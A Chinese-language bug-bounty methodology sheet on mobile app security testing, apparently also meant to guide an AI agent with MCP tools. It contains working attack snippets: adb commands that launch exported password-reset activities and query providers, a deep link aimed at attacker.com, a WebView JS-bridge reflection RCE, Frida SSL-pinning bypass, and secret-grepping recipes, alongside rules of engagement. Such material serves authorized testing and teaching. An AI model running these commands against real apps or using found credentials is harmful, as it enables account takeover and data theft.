# 移动端（Android / iOS）安全

> 视角：黑盒，对 APK / IPA 做静态 + 动态分析，重点是导出组件、Intent、WebView、数据存储、证书校验

## 1. 一句话说清

移动端漏洞 = 客户端做了"不该客户端做"的安全决策（鉴权、加密、校验）。
SRC 价值：APK 中泄露的硬编码 secret / API key = P1（$500–$3k）；导出组件能触发账户操作 = P0；中间人能读 token = P0–P1。

---

## 2. 高频入口点（OWASP MASVS / Mobile Top 10 2024）

| ID | 风险 | Android | iOS |
|----|------|---------|------|
| M1 | 凭证使用 | Keystore 误用、硬编码 | Keychain 配置 |
| M2 | 供应链 | 恶意 SDK | 第三方框架 |
| M3 | 认证 / 授权 | Intent 劫持、导出组件 | URL Scheme 劫持 |
| M4 | 输入输出 | WebView XSS、SQL 注入 | WKWebView 注入 |
| M5 | 通信 | 证书校验绕过、明文 | ATS 配置不当 |
| M6 | 隐私 | 日志、剪贴板 | 后台截图、Pasteboard |
| M7 | 二进制保护 | 无混淆、调试 | 越狱检测绕过 |
| M8 | 安全配置 | debuggable=true | Entitlements |
| M9 | 数据存储 | SharedPreferences 明文 | NSUserDefaults |
| M10 | 密码学 | ECB、弱随机 | CommonCrypto |

---

## 3. 探测手法

### 3.1 工具栈

```bash
# 静态
apktool d app.apk         # 反编译资源
jadx-gui app.apk          # Java 反编译
ghidra / IDA              # 二进制
mobsf                     # 自动化

# iOS
class-dump                # Obj-C class
otool / nm                # 二进制信息
hopper / IDA              # 反编译

# 动态
adb logcat                # Android 日志
frida                     # 动态注入
objection                 # frida 封装
drozer                    # Android 安全工具
xposed                    # hook 框架

# 抓包
HTTP Toolkit / Burp + 安装 CA
mitmproxy
Charles
SSL Killswitch / Frida 解 pinning
```

### 3.2 Android 关键点

#### 导出组件（Activity / Service / Receiver / Provider）

```bash
# 看 AndroidManifest.xml
apktool d app.apk
grep -E 'exported="true"|<intent-filter>' app/AndroidManifest.xml
```

危险样例：

```xml
<activity android:exported="true" android:name=".admin.ResetPasswordActivity"/>
<service android:exported="true" android:name=".PaymentService"/>
<receiver android:exported="true" android:name=".SmsReceiver"/>
<provider android:exported="true" android:name=".UserDataProvider"/>
```

利用：

```bash
# 攻击者 APP 调用导出 Activity
adb shell am start -n com.victim.app/.admin.ResetPasswordActivity --es new_password "hacked123"

# 或写攻击 APP
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.victim.app", "com.victim.app.admin.ResetPasswordActivity"));
intent.putExtra("new_password","hacked");
startActivity(intent);

# Provider 读数据
adb shell content query --uri content://com.victim.app.provider/users
```

#### Intent 注入 / 重定向

```java
// 漏洞代码
Intent forward = getIntent().getParcelableExtra("next_intent");
startActivity(forward);  // 任意 Activity 可达

// 或 URI 解析
String uri = getIntent().getStringExtra("uri");
Intent parsed = Intent.parseUri(uri, 0);
startActivity(parsed);  // intent:// 可指向任意组件
```

利用：构造恶意 intent → 启动应用内部敏感 Activity。

#### Deep Link / URL Scheme 劫持

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="myapp"/>
</intent-filter>
```

测试：
```
adb shell am start -W -a android.intent.action.VIEW -d "myapp://open?url=https://attacker.com"
```

如果 deep link 把 url 参数传到 WebView → 钓鱼 / XSS / 文件读。

#### WebView

危险配置：
```java
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
webView.addJavascriptInterface(new WebAppInterface(), "Android");
```

利用：API < 17 + addJavascriptInterface → 反射 RCE
```js
// 通过 WebView 中的 JS
function exec(cmd) {
    return Android.getClass().forName("java.lang.Runtime")
        .getMethod("getRuntime", null).invoke(null, null)
        .exec(cmd);
}
exec("id");
```

#### 数据存储

```bash
adb shell run-as com.victim.app
# 看：
ls -la /data/data/com.victim.app/shared_prefs/
ls -la /data/data/com.victim.app/databases/
ls -la /data/data/com.victim.app/files/

# 危险表现：
# - 明文 password / token 在 .xml
# - 未加密 sqlite
# - 文件存到 /sdcard/（其他应用可读）
```

#### 证书 Pinning 绕过

```bash
# Frida + objection
objection -g com.victim.app explore
> android sslpinning disable

# 或直接 frida script
frida -U -l fridascript.js com.victim.app

# script.js 例子
Java.perform(function() {
    var array = Java.use("javax.net.ssl.TrustManager");
    // ... 重写 checkServerTrusted 为空
});
```

绕过后用 Burp 抓 HTTPS 流量 → 找服务端漏洞。

### 3.3 iOS 关键点

#### URL Scheme 劫持

```
Info.plist 中的 CFBundleURLTypes
打开 myapp://... → 应用响应
任何 APP 都能注册同名 scheme，先注册的赢
```

#### Pasteboard 泄露

```swift
// 应用把敏感数据写到通用剪贴板
UIPasteboard.general.string = userToken  // 任何 APP 可读
```

#### Keychain ACL

```
看 Keychain entry 的 kSecAttrAccessible：
  AlwaysThisDeviceOnly: 解锁后才读
  Always: 总是可读（旧设备危险）
看是否设了 kSecAttrAccessGroup（共享 keychain，跨 APP 可读）
```

#### URL 处理 / WKWebView

类似 Android WebView 风险：JavaScript bridge、文件访问、cookie 共享。

#### ATS（App Transport Security）

```xml
NSAppTransportSecurity
  NSAllowsArbitraryLoads = YES   ← 允许 HTTP，危险
```

### 3.4 通用：API 端点抓取

无论 Android / iOS，最有价值的工作是：

```
1. 装 CA、绕 pinning
2. 跑 APP 各功能
3. 抓所有 HTTP 请求（Burp / mitmproxy）
4. 把每个 endpoint 当 Web API 一样测：
   → 鉴权（删 token 看是否仍能访问）
   → IDOR（改 user_id）
   → Mass Assignment
   → SQLi / RCE
5. APP 暴露的"内部接口"通常 PC 端没暴露（隐藏端点 + 鉴权薄弱）
```

### 3.5 静态扫描快速命令

```bash
# 提取硬编码 secret
apktool d app.apk -o app/
grep -rE "(api[_-]?key|secret|token|password|aws[_-]?access)" app/

# 找硬编码 URL（内部 API）
grep -rE "https?://[^/]+\.[a-z]{2,}/" app/smali/ | sort -u

# 找硬编码 IP（内网）
grep -rE "([0-9]{1,3}\.){3}[0-9]{1,3}" app/smali/ | sort -u

# 字符串
strings classes.dex | grep -iE "(password|secret|key|token|jdbc)"
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| 证书 pinning | Frida sslpinning script / objection / SSL Killswitch（iOS） |
| Root / 越狱检测 | objection android root disable / Frida hook |
| 反调试 | Frida 反 anti-frida / 修改 ptrace 调用 |
| 代码混淆 | jadx 还是能看大致结构 / 关注 native 库 |
| Native 库 | Ghidra / IDA Pro 反编译 .so / dyld |
| 加固 | 360 加固、腾讯乐固 → 用脱壳工具 frida-dexdump |

---

## 5. 利用 / 横向

```
APP 中硬编码的 API key → 直接调云服务 API（AWS / Aliyun OSS）
APP 抓包发现内部接口 → IDOR / Mass Assignment
导出 Activity → 跳转到敏感页面（修改密码、绑定手机）
WebView XSS → 偷 cookie / 调 JS bridge → 本地命令
中间人 + 弱 token → 接管账号
```

---

## 6. 真实案例指纹

| 类型 | 示例 |
|------|------|
| 硬编码 AWS key | 多家上市公司 APP 在反编译后能找到 prod IAM |
| Firebase 数据库未授权 | Firebase URL `https://app-xxx.firebaseio.com/.json` 无 auth |
| 未授权 deep link | 调用 `myapp://transfer?to=attacker&amount=999` |
| WebView JS bridge | API < 17 反射 RCE |
| 证书 pinning 缺失 | 装 CA 即可抓 HTTPS |
| 静态 API key | Google Maps、Stripe（test mode）、SendGrid |

通用指纹：

- jadx 反编译后看到 `OkHttp` / `Retrofit` 配置 → 抓 API
- AndroidManifest 含 `android:debuggable="true"` → 可附加调试
- Application 节点 `android:allowBackup="true"` → adb backup 可读取数据
- 字符串中含 `BEGIN RSA PRIVATE KEY` / `aws_access_key_id` → 立即报告
- Firebase URL 末尾加 `/.json` 返回数据 → 数据库未授权

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. APK / IPA 的 hash + 版本
2. 反编译截图（jadx 的代码 + 文件路径）
3. 利用步骤（adb / Frida / Burp）
4. 截图证据（被启动的 Activity、Frida 输出、Burp 流量）

### 7.2 PoC 模板（导出组件）

```
APK：com.victim.app v3.2.1（sha256:xxx）

漏洞组件：
  AndroidManifest.xml 第 N 行：
  <activity android:exported="true" android:name=".admin.ResetPasswordActivity"/>

利用：
  adb shell am start -n com.victim.app/.admin.ResetPasswordActivity \
    --es target_user "victim_user_id" --es new_password "hunter_test_2025"

结果：
  ResetPasswordActivity 直接被启动并完成密码重置（截图）
```

### 7.3 PoC 模板（硬编码凭据）

```
反编译：jadx-gui app.apk
位置：sources/com/victim/network/ApiClient.java:42
代码：
  private static final String AWS_KEY = "AKIA....（前 4 + 后 4 脱敏）";
  private static final String AWS_SECRET = "abc...（脱敏）";

证明：
  aws sts get-caller-identity --profile vuln-test
  → "Arn":"arn:aws:iam::****:user/****"

仅做身份验证，未实际访问 / 列举 / 读取任何资源。
```

### 7.4 CVSS

```
导出组件 → 重置任意密码                     = 8.8 High
WebView JS bridge RCE                       = 8.1 High
硬编码生产 AWS key                          = 9.1–9.8 Critical
缺证书 pinning + 弱 token                   = 6.5–8.1
明文存储用户 password / token               = 6.5
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__adb_apk_analyze` | adb-bridge | APK 包名 / 权限 / 组件 / 签名静态分析前置 |
| `mcp__jshook__tls_cert_pin_bypass_frida` | boringssl-inspector | Frida 注入绕过 SSL pinning(BoringSSL / OkHttp / Chrome) |
| `mcp__jshook__proxy_setup_adb_device` + `mcp__jshook__proxy_status` | proxy | 配置 Android 设备走本地代理,接 Burp / mitm |
| `mcp__jshook__adb_webview_attach` + `mcp__jshook__adb_webview_list` | adb-bridge | 远调 App 内嵌 WebView,跑 CDP / 注 JS |
| `mcp__jshook__tls_keylog_enable` + `mcp__jshook__tls_keylog_parse` | boringssl-inspector | 抓 SSLKEYLOGFILE 给 Wireshark 解密用 |

完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：用拿到的硬编码凭据实际操作云资源（创建 / 删除 / 列举资源）。仅 `sts get-caller-identity` 验证。
- **禁**：通过导出组件实际触发支付 / 转账 / 删数据。在自己控制的账号上验证。
- **禁**：把反编译的源码 / 字符串上传到第三方 / GitHub。本地保存，报告后删除。
- **禁**：在生产环境批量调用 APP 内部接口（容易触发风控被封号）。
- **限**：测试设备使用研究员自己的，不要装到亲友设备。

---

## H1 真实案例

_共 8 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | — | TikTok | [Multiple bugs leads to RCE on TikTok for Android](https://hackerone.com/reports/1065500) | Multiple bugs leads to RCE on TikTok for Android |
| High | 750 usd | Eternal | [[Zomato Order] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/532225) | Hello, i want to report the vulnerability found, Since the following activity `com.application.zomato.activities.DeepLinkRouter… |
| Critical | — | Paragon Initiative Enterprises | [[Critical] billion dollars issue](https://hackerone.com/reports/244836) | Hey, My name is El-Sisi also i have famous name is بلحه (Balaha) and i have found documents that confirm you the github inc bel… |
| High | — | Node.js | [Node.js: TLS session reuse can lead to hostname verification bypass](https://hackerone.com/reports/811502) | The Node.js TLS library supports client side reuse of TLS sessions when multiple connections to the same server are opened |
| High | — | Ubiquiti Inc. | [Catch mails sent to an SMTP Server over SSL using an Evil SMTP Server](https://hackerone.com/reports/519582) | Catch mails sent to an SMTP Server over SSL using an Evil SMTP Server |
| High | — | Internet Bug Bounty | [Industry-Wide MITM Vulnerability Impacting the JVM Ecosystem](https://hackerone.com/reports/608620) | I've been exploring the industry-wide scope of the use of HTTP to resolve dependencies in build infrastructure across the industry |
| High | — | Concrete CMS | [Fetching the update json scheme from concrete5 over HTTP leads to remote code execution](https://hackerone.com/reports/982130) | Hi, I noticed that concrete5 fetches the update JSON scheme from www.concrete5.org over HTTP |
| High | — | Central Security Project | [Repositories of datanucleus are fetched over insecure protocol (http insted of https)](https://hackerone.com/reports/879740) | Repositories of datanucleus are fetched over insecure protocol (http insted of https) |

**命中本类的 weakness 分布：**

- Man-in-the-Middle：6 条
- Uncategorized → 手工归类：1 条
- Improper Export of Android Application Components：1 条
